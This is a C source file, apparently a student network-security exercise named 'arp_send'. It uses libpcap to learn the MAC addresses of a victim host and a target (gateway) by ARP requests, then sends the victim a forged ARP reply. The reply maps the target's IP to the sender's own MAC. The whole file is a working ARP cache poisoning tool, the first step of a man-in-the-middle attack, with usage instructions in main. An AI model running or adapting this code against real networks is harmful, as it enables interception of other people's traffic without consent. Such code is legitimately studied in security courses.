#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if.h>

#define ARP_REQUEST     0x0001
#define ARP_REPLY       0x0002

struct arp_hdr{
    uint16_t ar_hrd;//arp header structure
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_sha[6];
    uint8_t ar_sip[4];
    uint8_t ar_tha[6];
    uint8_t ar_tip[4];
    };


typedef struct packet_info{
    char *dev_name;
    uint8_t my_ip[4];
    uint8_t target_ip[4];
    uint8_t sender_ip[4];//pton use change
    uint8_t my_mac[6];
    uint8_t sender_mac[6];
    uint8_t target_mac[6];
    }PACKET_INFO;

int get_my_info(char * dev_name ,uint8_t *struc_p,u_char *struc_mac);
void get_mac_addr(pcap_t * pack_d,PACKET_INFO *pack_buf, uint8_t *input_ip, uint8_t *recv_mac);//pd,&pack_info,pack_info.sender_ip
int ether_check(uint8_t *pack1);
int arp_check(uint8_t *pack2,uint8_t *req_ip,uint8_t *input_mac);//,uint8_t *struc_info_mac,
void request_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info);//edit this part
void request_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info,uint8_t *ip_addr);
void reply_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info);
void reply_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info);
void send_arp_packet(uint8_t *send_arp,pcap_t *pack_d,int packet_size);


int main(int argc, char *argv[])
{
   //at first argument num is  "filename dev senderIp targetIp sendermac targetmac"
    if (argc !=4){
        printf("\nplease check your argument form\n");
        printf("arp_send [device] [sender ip(1.1.1.1)] [target ip(1.1.1.1)]\n");
        exit(1);
    }
    PACKET_INFO pack_info;//structure

    pack_info.dev_name = argv[1];//input device in structure
    inet_pton(AF_INET,argv[2],pack_info.sender_ip);
    inet_pton(AF_INET,argv[3],pack_info.target_ip);


    get_my_info(argv[1],&pack_info.my_ip[0],&pack_info.my_mac[0]);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * pd = pcap_open_live(pack_info.dev_name, BUFSIZ, 1, 300, errbuf);

    get_mac_addr(pd,&pack_info,pack_info.sender_ip,pack_info.sender_mac);
    get_mac_addr(pd,&pack_info,pack_info.target_ip,pack_info.target_mac);


    uint8_t send_buffer[sizeof(ether_header)+sizeof(arp_hdr)];

    struct ether_header *eth_hdr_p = (struct ether_header *)&send_buffer;
    struct arp_hdr *arp_hdr_p =(struct arp_hdr *) &send_buffer[sizeof(ether_header)];

    reply_ether_info(eth_hdr_p,&pack_info);
    reply_arp_info(arp_hdr_p,&pack_info);

    send_arp_packet((uint8_t*)&send_buffer,pd,sizeof(send_buffer));
    printf("send_arp reply Done.");

    return 0;
}



int get_my_info(char * dev_name ,uint8_t *struc_p,u_char *struc_mac)
{

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) {
        printf("socket error\n");
        return -1;
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev_name);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0){
        printf("IpAddr ioctl() error\n");                       // Get IP Adress
        return -1;
    }
    memcpy(struc_p,ifr.ifr_addr.sa_data+2,sizeof(uint32_t));

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
        printf("MAC ioctl() error\n");                          //get mac addr
        return -1;
    }
    memcpy(struc_mac,ifr.ifr_hwaddr.sa_data,sizeof(u_char)*6);
    return 0;
}


void get_mac_addr(pcap_t * pack_d,PACKET_INFO *pack_buf, uint8_t *input_ip, uint8_t *recv_mac)//pd,&pack_info,pack_info.sender_ip
{
    uint8_t arp_req_buf[sizeof(ether_header)+sizeof(arp_hdr)];                                            //edit this part
    request_ether_info((struct ether_header *)&arp_req_buf,pack_buf);
    request_arp_info((struct arp_hdr *)&arp_req_buf[sizeof(ether_header)],pack_buf,input_ip);


    send_arp_packet((uint8_t *)&arp_req_buf,pack_d,sizeof(arp_req_buf));

    int loopstatus = 0;
    const uint8_t *pkt_data;
    struct pcap_pkthdr *pkt_hdr;

    while((loopstatus = pcap_next_ex(pack_d, &pkt_hdr, &pkt_data)) >= 0){//pkt_data 's adress
        (void)pkt_hdr;//useless

        if(loopstatus == 0)
            continue;//timeout check

        if(ether_check((uint8_t *)pkt_data)== -1)
            continue;

        if(arp_check((uint8_t *)pkt_data,input_ip,recv_mac) == -1)//packet_data,ip,info_struc
            continue;//return value 0 then mov next function and if value -1 then restart loop

        printf("\nGet MacAddress Done.\n");

        break;

    }
    if(loopstatus == -1 || loopstatus == -2)
        pcap_perror(pack_d,"Packet data read error");



}

int ether_check(uint8_t *pack1)
{
    uint16_t *check_eth_type = (uint16_t *)&pack1[12];

    if(ntohs(*check_eth_type) == ETHERTYPE_ARP)//if arp packet pass
        return 0;
    else
        return -1;
}


int arp_check(uint8_t *pack2,uint8_t *req_ip,uint8_t *input_mac)//,uint8_t *struc_info_mac,
{
    struct arp_hdr *arp_data1 =(struct arp_hdr *)&pack2[sizeof(ether_header)];

    if(ntohs(arp_data1->ar_op) != ARP_REPLY)//arp_opcode check
        return -1;

    if((uint32_t)*arp_data1->ar_sip == (uint32_t)*req_ip){//right ip then get mac
        memcpy(input_mac,arp_data1->ar_sha,sizeof(uint8_t)*6);
        return 0;
    }else
        return -1;


}

void request_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info)//edit this part
{
    for(int i=0;i<6;i++)
        eth_p->ether_dhost[i]=0xff;
    memcpy(eth_p->ether_shost,eth_info->my_mac,sizeof(uint8_t)*6);
    eth_p->ether_type = htons(ETHERTYPE_ARP);
}



void request_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info,uint8_t *ip_addr)
{
    memcpy(arp_p->ar_sip,arp_info->my_ip,sizeof(uint8_t)*4);//my ip->sender ip **
    memcpy(arp_p->ar_tip,ip_addr,sizeof(uint8_t)*4);//sender ip->target ip
    memcpy(arp_p->ar_sha,arp_info->my_mac,sizeof(uint8_t)*6);//my mac->sender hw
    for(int i=0;i<6;i++)
        arp_p->ar_tha[i]=0;                         //sender mac->target hw **
    arp_p->ar_hrd = htons(0x0001);
    arp_p->ar_pro = htons(0x0800);
    arp_p->ar_hln=6;
    arp_p->ar_pln=4;
    arp_p->ar_op = htons(ARP_REQUEST);//if i send arp request then need it **

}



void reply_ether_info(struct ether_header *eth_p,PACKET_INFO * eth_info)
{
    memcpy(eth_p->ether_dhost,eth_info->sender_mac,sizeof(uint8_t)*6);
    memcpy(eth_p->ether_shost,eth_info->my_mac,sizeof(uint8_t)*6);
    eth_p->ether_type = htons(ETHERTYPE_ARP);
}


void reply_arp_info(struct arp_hdr *arp_p,PACKET_INFO *arp_info)
{
    memcpy(arp_p->ar_sip,arp_info->target_ip,sizeof(uint8_t)*4);//gateway ip->sender ip
    memcpy(arp_p->ar_tip,arp_info->sender_ip,sizeof(uint8_t)*4);//sender ip->target ip
    memcpy(arp_p->ar_sha,arp_info->my_mac,sizeof(uint8_t)*6);//my mac->sender hw
    memcpy(arp_p->ar_tha,arp_info->sender_mac,sizeof(uint8_t)*6);//sender mac->target hw
    arp_p->ar_hrd = htons(0x0001);
    arp_p->ar_pro = htons(0x0800);
    arp_p->ar_hln=6;
    arp_p->ar_pln=4;
    arp_p->ar_op = htons(0x0002);//if i send arp request then need it
}


void send_arp_packet(uint8_t *send_arp,pcap_t *pack_d,int packet_size)
{
    int result =pcap_sendpacket(pack_d,send_arp,packet_size);
    if(result !=0)
        pcap_perror(pack_d,"packet send error");

    return;
}

